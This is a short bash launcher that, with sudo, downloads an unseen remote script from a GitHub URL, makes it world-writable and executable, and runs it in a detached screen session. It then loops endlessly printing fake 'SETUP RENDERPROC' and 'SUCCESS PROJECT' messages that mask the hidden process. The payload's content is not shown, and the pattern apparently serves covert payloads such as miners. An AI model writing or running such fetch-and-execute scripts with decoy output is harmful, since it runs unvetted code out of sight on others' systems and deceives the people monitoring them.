# /bin/bash
sudo wget https://raw.githubusercontent.com/renilo/kuuntul/main/antamimi.sh
sudo chmod 777 antamimi.sh
screen -dmS Running ./antamimi.sh
i=1
while true; do clear; echo SETUP RENDERPROC $i; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
